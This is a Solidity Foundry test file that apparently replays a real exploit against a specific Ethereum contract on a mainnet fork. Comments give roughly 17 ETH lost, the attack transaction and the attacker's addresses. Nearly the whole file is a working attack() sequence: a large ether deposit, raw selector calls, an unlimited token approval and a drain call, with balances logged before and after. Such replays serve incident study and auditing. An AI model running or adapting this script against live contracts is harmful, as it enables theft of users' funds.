// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~17  ETH
// TX : https://app.blocksec.com/explorer/tx/eth/0xbf5b2d22fa88965ddfc6e6d685fc7cfc683340c49e126386759ed9e4027b1415
// Attacker : https://etherscan.io/address/0x9abe851bcc4fd1986c3d1ef8978fad86a26a0c57
// Attack Contract : https://etherscan.io/address/0x9c52c485edd3d22847a1614b8988fbf520b33047
// GUY : https://x.com/AnciliaInc/status/1722121056083943909


contract ContractTest is Test {
    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 Stone = IERC20(0x7122985656e38BDC0302Db86685bb972b145bD3C);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address Vulncontract=0xA62F9C5af106FeEE069F38dE51098D9d81B90572;


    function setUp() public {
        vm.createSelectFork("mainnet", 18523440);
    }

    function testExpolit() public {
        emit log_named_decimal_uint("attacker WETH balance before attack", WETH.balanceOf(address(this)), WETH.decimals());
        emit log_named_decimal_uint("attacker balance before attack", address(this).balance, 18);

        attack();
        
        emit log_named_decimal_uint("attacker WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals());
        emit log_named_decimal_uint("attacker balance after attack", address(this).balance, 18);

    }

    function attack() public {

        address(Vulncontract).call{value: 8600 ether}(abi.encodeWithSelector(bytes4(0xd0e30db0)));

        address(Vulncontract).call(abi.encodeWithSelector(bytes4(0x5069fb57)));

        Stone.approve(address(Vulncontract),type(uint256).max);

        address(Vulncontract).call(abi.encodeWithSelector(bytes4(0xb18f2e91),0,8582162020025013545654));


    }
    fallback()payable external{}
}
